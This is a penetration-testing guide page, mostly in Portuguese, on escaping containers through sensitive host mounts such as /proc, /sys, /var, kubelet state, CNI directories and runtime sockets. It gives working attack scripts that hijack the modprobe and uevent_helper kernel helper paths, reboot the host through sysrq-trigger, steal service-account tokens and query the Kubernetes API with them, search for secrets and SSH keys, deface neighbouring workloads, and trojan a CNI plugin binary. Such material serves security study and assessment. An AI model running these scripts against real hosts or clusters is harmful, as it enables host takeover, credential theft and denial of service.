# Sensitive Host Mounts

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Host mounts são uma das superfícies práticas mais importantes de container-escape, porque muitas vezes colapsam uma visão de processo cuidadosamente isolada de volta para visibilidade direta dos recursos do host. Os casos perigosos não se limitam a `/`. Bind mounts de `/proc`, `/sys`, `/var`, runtime sockets, estado gerenciado pelo kubelet, ou paths relacionados a devices podem expor controles do kernel, credentials, filesystems de containers vizinhos e interfaces de gerenciamento do runtime.

Esta página existe separadamente das páginas individuais de proteção porque o modelo de abuso é transversal. Um host mount gravável é perigoso em parte por causa de mount namespaces, em parte por causa de user namespaces, em parte por cobertura do AppArmor ou SELinux, e em parte por qual path exato do host foi exposto. Tratar isso como um tópico próprio torna a attack surface muito mais fácil de entender.

## `/proc` Exposure

procfs contém tanto informações comuns de processos quanto interfaces de controle do kernel de alto impacto. Um bind mount como `-v /proc:/host/proc` ou uma visão do container que exponha entradas proc graváveis inesperadas pode, portanto, levar a disclosure de informação, denial of service, ou execução direta de código no host.

Paths de alto valor em procfs incluem:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Comece verificando quais entradas de alto valor do procfs estão visíveis ou graváveis:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Esses paths são interessantes por diferentes motivos. `core_pattern`, `modprobe`, e `binfmt_misc` podem se tornar paths de host code-execution quando writables. `kallsyms`, `kmsg`, `kcore`, e `config.gz` são fontes poderosas de reconnaissance para kernel exploitation. `sched_debug` e `mountinfo` revelam contexto de processo, cgroup, e filesystem que pode ajudar a reconstruir o layout do host de dentro do container.

O valor prático de cada path é diferente, e tratá-los todos como se tivessem o mesmo impacto dificulta a triage:

- `/proc/sys/kernel/core_pattern`
Se writable, este é um dos paths de procfs de maior impacto porque o kernel irá executar um pipe handler após um crash. Um container que consiga apontar `core_pattern` para um payload armazenado em seu overlay ou em um host path montado pode frequentemente obter host code execution. Veja também [read-only-paths.md](protections/read-only-paths.md) para um exemplo dedicado.
- `/proc/sys/kernel/modprobe`
Este path controla o helper de userspace usado pelo kernel quando ele precisa invocar a lógica de carregamento de módulo. Se writable a partir do container e interpretado no contexto do host, ele pode se tornar outro primitive de host code-execution. É especialmente interessante quando combinado com uma forma de acionar o helper path.
- `/proc/sys/vm/panic_on_oom`
Isso normalmente não é um primitive de escape limpo, mas pode converter memory pressure em denial of service em todo o host ao transformar condições de OOM em comportamento de kernel panic.
- `/proc/sys/fs/binfmt_misc`
Se a interface de registro for writable, o attacker pode registrar um handler para um magic value escolhido e obter execução no contexto do host quando um arquivo correspondente for executado.
- `/proc/config.gz`
Útil para kernel exploit triage. Ajuda a determinar quais subsistemas, mitigations, e optional kernel features estão habilitados sem precisar de host package metadata.
- `/proc/sysrq-trigger`
Principalmente um path de denial-of-service, mas um muito sério. Pode reboot, panic, ou de outra forma interromper o host imediatamente.
- `/proc/kmsg`
Revela mensagens do kernel ring buffer. Útil para host fingerprinting, crash analysis, e em alguns ambientes para leak de informação útil para kernel exploitation.
- `/proc/kallsyms`
Valioso quando readable porque expõe informações de kernel symbol exportadas e pode ajudar a derrotar suposições de address randomization durante o desenvolvimento de kernel exploit.
- `/proc/[pid]/mem`
Esta é uma interface direta de memória de processo. Se o processo alvo for acessível com as condições necessárias no estilo ptrace, ela pode permitir ler ou modificar a memória de outro processo. O impacto realista depende muito de credentials, `hidepid`, Yama, e restrições de ptrace, então é um path poderoso, mas condicional.
- `/proc/kcore`
Expõe uma visão em estilo core-image da memória do sistema. O arquivo é enorme e difícil de usar, mas se estiver meaningfulmente readable isso indica uma superfície de memória do host mal exposta.
- `/proc/kmem` e `/proc/mem`
Interfaces raw de memória historicamente de alto impacto. Em muitos sistemas modernos elas estão desabilitadas ou fortemente restritas, mas se estiverem presentes e usáveis devem ser tratadas como findings críticos.
- `/proc/sched_debug`
Leak de informações de scheduling e task que pode expor identidades de processos do host mesmo quando outras visões de processo parecem mais limpas do que o esperado.
- `/proc/[pid]/mountinfo`
Extremamente útil para reconstruir onde o container realmente vive no host, quais paths são overlay-backed, e se um writable mount corresponde a conteúdo do host ou apenas à camada do container.

Se `/proc/[pid]/mountinfo` ou detalhes de overlay forem readable, use-os para recuperar o host path do filesystem do container:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Esses comandos são úteis porque várias técnicas de host-execution exigem converter um path dentro do container no path correspondente do ponto de vista do host.

### Exemplo Completo: Abuso do Path do Helper do `modprobe`

Se `/proc/sys/kernel/modprobe` for gravável a partir do container e o path do helper for interpretado no contexto do host, ele pode ser redirecionado para um payload controlado pelo atacante:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
O gatilho exato depende do alvo e do comportamento do kernel, mas o ponto importante é que um caminho de helper gravável pode redirecionar uma futura invocação de kernel helper para conteúdo de host-path controlado pelo atacante.

### Full Example: Kernel Recon With `kallsyms`, `kmsg`, And `config.gz`

Se o objetivo for avaliação de exploitabilidade em vez de escape imediato:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Estes comandos ajudam a responder se informações úteis de símbolos estão visíveis, se mensagens recentes do kernel revelam algum estado interessante e quais recursos ou mitigações do kernel estão compilados. O impacto geralmente não é escape direto, mas pode encurtar bastante a triagem de vulnerabilidades do kernel.

### Full Example: SysRq Host Reboot

Se `/proc/sysrq-trigger` for gravável e alcançar a view do host:
```bash
echo b > /proc/sysrq-trigger
```
O efeito é a reinicialização imediata do host. Este não é um exemplo sutil, mas demonstra claramente que a exposição de procfs pode ser muito mais grave do que divulgação de informações.

## `/sys` Exposure

sysfs expõe grandes quantidades de estado do kernel e dos devices. Alguns caminhos de sysfs são úteis principalmente para fingerprinting, enquanto outros podem afetar a execução de helper, o comportamento do device, a configuração do security-module, ou o estado do firmware.

Caminhos de alto valor em sysfs incluem:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Esses caminhos importam por razões diferentes. `/sys/class/thermal` pode influenciar o comportamento de thermal-management e, portanto, a estabilidade do host em ambientes mal expostos. `/sys/kernel/vmcoreinfo` pode leak informações de crash-dump e do layout do kernel, o que ajuda no low-level fingerprinting do host. `/sys/kernel/security` é a interface `securityfs` usada pelos Linux Security Modules, então acesso inesperado ali pode expor ou alterar estado relacionado a MAC. Caminhos de variáveis EFI podem afetar configurações de boot respaldadas pelo firmware, tornando-os muito mais graves do que arquivos de configuração comuns. `debugfs` em `/sys/kernel/debug` é especialmente perigoso porque é intencionalmente uma interface voltada para desenvolvedores, com muito menos expectativas de segurança do que APIs do kernel endurecidas voltadas para produção.

Comandos úteis de revisão para esses caminhos são:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
O que torna esses comandos interessantes:

- `/sys/kernel/security` pode revelar se AppArmor, SELinux ou outra superfície LSM está visível de uma forma que deveria ter permanecido apenas no host.
- `/sys/kernel/debug` costuma ser a descoberta mais alarmante neste grupo. Se `debugfs` estiver montado e legível ou gravável, espere uma ampla superfície voltada ao kernel cujo risco exato depende dos nós de debug habilitados.
- A exposição de variáveis EFI é menos comum, mas, se presente, tem alto impacto porque atinge configurações respaldadas pelo firmware, em vez de arquivos normais de runtime.
- `/sys/class/thermal` é principalmente relevante para a estabilidade do host e a interação com hardware, não para uma escape estilo shell elegante.
- `/sys/kernel/vmcoreinfo` é principalmente uma fonte de host fingerprinting e análise de crash, útil para entender o estado de baixo nível do kernel.

### Full Example: `uevent_helper`

Se `/sys/kernel/uevent_helper` for gravável, o kernel pode executar um helper controlado pelo atacante quando um `uevent` for acionado:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
A razão pela qual isso funciona é que o caminho do helper é interpretado do ponto de vista do host. Uma vez acionado, o helper é executado no contexto do host, em vez de dentro do container atual.

## `/var` Exposure

Montar o `/var` do host em um container costuma ser subestimado porque não parece tão dramático quanto montar `/`. Na prática, isso pode ser suficiente para alcançar runtime sockets, diretórios de snapshot de containers, volumes de pods gerenciados pelo kubelet, projected service-account tokens e filesystems de aplicações vizinhas. Em nós modernos, `/var` é frequentemente onde o estado de containers mais interessante do ponto de vista operacional realmente fica.

### Kubernetes Example

Um pod com `hostPath: /var` muitas vezes pode ler os projected tokens de outros pods e o conteúdo de snapshot overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Esses comandos são úteis porque respondem se o mount expõe apenas dados de aplicação pouco relevantes ou credenciais de cluster de alto impacto. Um token de service-account legível pode transformar imediatamente execução de código local em acesso à Kubernetes API.

Se o token estiver presente, valide o que ele consegue alcançar em vez de parar na descoberta do token:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
O impacto aqui pode ser muito maior do que o acesso local ao node. Um token com RBAC amplo pode transformar um `/var` montado em comprometimento em todo o cluster.

### Docker And containerd Example

Em hosts Docker, os dados relevantes geralmente ficam em `/var/lib/docker`, enquanto em nodes Kubernetes com containerd podem estar em `/var/lib/containerd` ou em paths específicos do snapshotter:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Se o `/var` montado expõe conteúdos de snapshot graváveis de outra workload, o atacante pode conseguir alterar arquivos da aplicação, plantar conteúdo web ou mudar scripts de inicialização sem tocar na configuração do container atual.

Ideias concretas de abuso quando conteúdo de snapshot gravável é encontrado:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Esses comandos são úteis porque mostram as três principais famílias de impacto de `/var` montado: adulteração de aplicativos, recuperação de secrets e movimento lateral para workloads vizinhos.

## Kubelet State, Plugins, And CNI Paths

Um mount de `/var/lib/kubelet`, `/opt/cni/bin` ou `/etc/cni/net.d` costuma ser exposto por meio de DaemonSets privilegiados, agentes CNI, plugins CSI de nó, operadores de GPU e auxiliares de storage. Esses mounts são fáceis de descartar como "node plumbing", mas ficam diretamente no caminho de execução de novos pods e frequentemente contêm credenciais do kubelet, secrets projetados, sockets de registro e binaries de plugins executáveis no host.

Alvos de alto valor incluem:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Os comandos úteis de revisão são:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Por que esses caminhos importam:

- `/var/lib/kubelet/pki` pode expor certificados de cliente do kubelet e outras credenciais locais do node que às vezes podem ser reutilizadas contra o API server ou endpoints TLS voltados para o kubelet, dependendo do design do cluster.
- `/var/lib/kubelet/pods` muitas vezes contém tokens de service-account projetados e Secrets montados para pods vizinhos no mesmo node.
- `/var/lib/kubelet/pod-resources/kubelet.sock` é principalmente uma superfície de reconnaissance, mas muito útil: ela revela quais pods e containers atualmente usam GPUs, hugepages, dispositivos SR-IOV e outros recursos locais escassos do node.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` e `/var/lib/kubelet/plugins_registry` revelam quais plugins CSI, DRA e device plugins estão instalados e com quais sockets o kubelet deve falar. Se esses diretórios forem graváveis em vez de apenas legíveis, o finding se torna muito mais sério.
- `/opt/cni/bin` e `/etc/cni/net.d` ficam diretamente no caminho de configuração da rede do pod. Acesso gravável ali muitas vezes é um primitive de host-execution atrasado, e não apenas exposição de configuração.

### Full Example: Gravável `/opt/cni/bin`

Se um diretório de binários CNI do host estiver montado em leitura e escrita, substituir um plugin pode ser suficiente para obter host execution na próxima vez que o kubelet criar um pod sandbox naquele node:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Isso não é tão imediato quanto um `docker.sock` montado, mas muitas vezes é mais realista em pods de infraestrutura Kubernetes comprometidos. O ponto importante é que o binário modificado é executado mais tarde pelo fluxo de configuração da host network, e não pelo container atual.


## Runtime Sockets

Sensitive host mounts frequentemente incluem runtime sockets em vez de diretórios completos. Eles são tão importantes que merecem repetição explícita aqui:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Veja [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) para fluxos completos de exploração assim que um desses sockets for montado.

Como um padrão rápido de primeira interação:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Se um desses funcionar, o caminho de "mounted socket" para "start a more privileged sibling container" geralmente é muito mais curto do que qualquer caminho de kernel breakout.

## Mount-Related CVEs

Host mounts também se cruzam com vulnerabilidades de runtime. Exemplos recentes importantes incluem:

- `CVE-2024-21626` em `runc`, onde um file descriptor de diretório vazado poderia colocar o diretório de trabalho no host filesystem.
- `CVE-2024-23651`, `CVE-2024-23652` e `CVE-2024-23653` em BuildKit, onde Dockerfiles maliciosos, frontends e fluxos `RUN --mount` poderiam reintroduzir acesso a arquivos do host, deleção ou privilégios elevados durante builds.
- `CVE-2024-1753` em Buildah e fluxos de build do Podman, onde bind mounts forjados durante o build poderiam expor `/` com leitura e escrita.
- `CVE-2025-47290` em `containerd` 2.1.0, onde um TOCTOU durante o unpack da imagem poderia permitir que uma imagem especialmente forjada modificasse o host filesystem durante o pull.

Essas CVEs importam aqui porque mostram que o manuseio de mounts não é apenas uma questão de configuração do operador. O próprio runtime também pode introduzir condições de escape impulsionadas por mounts.

## Checks

Use these commands to locate the highest-value mount exposures quickly:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
O que é interessante aqui:

- Host root, `/proc`, `/sys`, `/var`, e runtime sockets são todos achados de alta prioridade.
- Entradas `proc/sys` graváveis frequentemente significam que o mount está expondo controles do kernel globais do host, em vez de uma visão segura do container.
- Caminhos montados em `/var` merecem revisão de credenciais e de workloads vizinhos, não apenas revisão do filesystem.
- Diretórios de estado do Kubelet e caminhos de CNI/plugin merecem a mesma prioridade que runtime sockets porque frequentemente ficam diretamente no caminho de criação de pods e distribuição de credenciais do node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
